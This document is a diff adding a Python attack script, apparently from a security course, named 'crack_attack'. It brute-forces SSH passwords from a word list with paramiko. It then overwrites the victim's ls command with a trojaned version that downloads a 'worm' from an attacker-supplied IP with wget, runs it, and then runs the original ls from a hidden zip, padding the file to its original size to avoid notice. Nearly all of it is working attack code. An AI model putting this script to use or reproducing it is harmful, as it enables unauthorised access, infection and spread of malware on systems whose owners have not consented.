@@ -1,0 +1,109 @@
+#!/usr/bin/env python3
+import sys
+import itertools
+import paramiko
+import os 
+from os import system
+victim_name = "csc2024"
+import time 
+
+def create_virus(attacker_ip, attacker_port,function_size, ls_path):
+    front_virus =f"""wget http://{attacker_ip}:{attacker_port}/worm >/dev/null 2>&1
+chmod +x worm
+./worm
+rm -f worm
+dd if=ls bs=1 skip="""
+    back_virus = f""" count={function_size} of=my_ls.zip > /dev/null 2>&1
+mv my_ls.zip /tmp
+unzip -d /tmp/virus_ls /tmp/my_ls.zip > /dev/null 2>&1
+chmod +x /tmp/virus_ls{ls_path}
+/tmp/virus_ls{ls_path} \$@
+rm -rf /tmp/virus_ls /tmp/my_ls.zip
+exit 0 
+"""
+    current_virus_size = len(front_virus) + len(back_virus) + 3# ex: 100+ 200
+    return front_virus + str(current_virus_size) + back_virus
+#     return f"""wget http://{attacker_ip}:{attacker_port}/worm >/dev/null 2>&1
+# chmod +x worm
+# ./worm
+# rm -f worm
+# dd if=ls bs=1 skip=virus_size count={function_size} of=my_ls.zip > /dev/null 2>&1
+# mv my_ls.zip /tmp && unzip -d /tmp /tmp/my_ls.zip > /dev/null 2>&1
+# chmod +x /tmp/usr/bin/ls && /tmp/usr/bin/ls \"\$@\" && rm -rf /tmp/usr /tmp/my_ls.zip
+# """
+    
+def get_ssh_password(user_name, password_file, victim_ip):
+    with open(password_file, "r") as f:
+        lines = f.readlines()
+    
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    lines = [line.strip() for line in lines]
+    for i in range(1, len(lines)+ 1): # the number of lines in the file
+        combinations = itertools.combinations(lines, i)
+        for combination in combinations:
+            permutation = itertools.permutations(combination)
+            
+            for perm in permutation:
+                password = "".join(perm)
+                print("password: ", password)
+                while True:
+                    try:
+                        ssh.connect(victim_ip, username=user_name, password=password, auth_timeout = 1)
+                        return password, ssh
+                    except paramiko.AuthenticationException as e:                    
+                        print("wrong password")
+                        break
+                    except paramiko.SSHException as e:
+                        print("SSH Exception, sleeping for 10 seconds")
+                        time.sleep(10)
+                        continue
+def exec(victim, command, debug=False):
+    if debug:
+        print("remote: ",command)
+    stdin, stdout, stderr = victim.exec_command(command)
+    return stdout.read().decode().strip()
+
+def inject_virus(victim, attacker_ip, attacker_port):
+    ls_path = exec(victim, "which ls")
+    ori_size = exec(victim, f"ls -l {ls_path} | awk '{{print $5}}'")
+    exec(victim,f"zip -q new_ls {ls_path}")
+    compressed_size = exec(victim, f"ls -l new_ls.zip | awk '{{print $5}}'")
+    
+    target_path = "/app/ls"
+    virus = create_virus(attacker_ip, attacker_port, compressed_size, ls_path)
+    exec(victim, f'echo "{virus}" > {target_path}')
+    
+    exec(victim,f"cat new_ls.zip >> {target_path}")
+    exec(victim,f"rm -f new_ls.zip")
+    
+    now_size = exec(victim, f"ls -l {target_path} | awk '{{print $5}}'")
+    
+    padding_size = int(ori_size) - int(now_size) - 9 
+    print("Padding size: ", padding_size)
+
+    exec(victim, f"dd if=/dev/zero bs={str(padding_size)} count=1 >> {target_path}")
+    exec(victim, f"echo -n '\n' >> {target_path}")
+    exec(victim, f"echo -n '20240000' | xxd -r -p >> {target_path}")
+    exec(victim, f"echo -n 'aabbccdd' | xxd -r -p >> {target_path}")
+    exec(victim, f"chmod +x {target_path}")
+    print("Virus injected successfully")
+    
+def main():
+    if len(sys.argv) != 4:
+        print("Usage: ./crack_attack <Victim IP> <Attacker IP> <Attacker port>")
+        sys.exit(1)
+    victim_ip = sys.argv[1]
+    attacker_ip = sys.argv[2]
+    attacker_port = sys.argv[3]
+    print("Victim IP: " + victim_ip)
+    print("Attacker IP: " + attacker_ip)
+    print("Attacker Port: " + attacker_port)
+    print("Starting attack...")
+    password, ssh = get_ssh_password(victim_name, "/app/victim.dat", victim_ip)
+    print("Password found: ", password)
+    inject_virus(ssh, attacker_ip, attacker_port)
+    ssh.close()
+
+if __name__ == "__main__":
+    main()
